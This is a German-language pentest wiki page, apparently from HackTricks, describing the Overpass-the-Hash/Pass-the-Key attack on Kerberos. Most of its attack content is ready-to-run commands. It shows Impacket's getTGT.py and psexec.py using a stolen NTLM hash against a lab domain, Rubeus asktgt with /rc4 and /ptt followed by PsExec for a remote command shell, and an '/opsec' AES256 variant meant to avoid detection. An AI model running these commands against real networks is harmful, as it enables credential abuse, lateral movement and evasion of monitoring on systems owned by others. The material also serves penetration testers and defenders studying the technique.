# Over Pass the Hash/Pass the Key

{{#include ../../banners/hacktricks-training.md}}


## Overpass The Hash/Pass The Key (PTK)

Der **Overpass The Hash/Pass The Key (PTK)** Angriff ist für Umgebungen konzipiert, in denen das traditionelle NTLM-Protokoll eingeschränkt ist und die Kerberos-Authentifizierung Vorrang hat. Dieser Angriff nutzt den NTLM-Hash oder die AES-Schlüssel eines Benutzers, um Kerberos-Tickets anzufordern, was unbefugten Zugriff auf Ressourcen innerhalb eines Netzwerks ermöglicht.

Um diesen Angriff auszuführen, besteht der erste Schritt darin, den NTLM-Hash oder das Passwort des Zielbenutzerkontos zu erlangen. Nach dem Sichern dieser Informationen kann ein Ticket Granting Ticket (TGT) für das Konto erhalten werden, was dem Angreifer den Zugriff auf Dienste oder Maschinen ermöglicht, für die der Benutzer Berechtigungen hat.

Der Prozess kann mit den folgenden Befehlen initiiert werden:
```bash
python getTGT.py jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```
Für Szenarien, die AES256 erfordern, kann die Option `-aesKey [AES key]` verwendet werden. Darüber hinaus kann das erworbene Ticket mit verschiedenen Tools wie smbexec.py oder wmiexec.py verwendet werden, was den Umfang des Angriffs erweitert.

Aufgetretene Probleme wie _PyAsn1Error_ oder _KDC kann den Namen nicht finden_ werden typischerweise durch ein Update der Impacket-Bibliothek oder durch die Verwendung des Hostnamens anstelle der IP-Adresse gelöst, um die Kompatibilität mit dem Kerberos KDC sicherzustellen.

Eine alternative Befehlssequenz mit Rubeus.exe zeigt einen weiteren Aspekt dieser Technik:
```bash
.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```
Diese Methode spiegelt den **Pass the Key**-Ansatz wider, mit dem Fokus auf die Übernahme und direkte Nutzung des Tickets zu Authentifizierungszwecken. Es ist wichtig zu beachten, dass die Initiierung einer TGT-Anfrage das Ereignis `4768: Ein Kerberos-Authentifizierungsticket (TGT) wurde angefordert` auslöst, was standardmäßig die Verwendung von RC4-HMAC bedeutet, obwohl moderne Windows-Systeme AES256 bevorzugen.

Um die operationale Sicherheit zu gewährleisten und AES256 zu verwenden, kann der folgende Befehl angewendet werden:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
```
## Referenzen

- [https://www.tarlogic.com/es/blog/como-atacar-kerberos/](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)


{{#include ../../banners/hacktricks-training.md}}
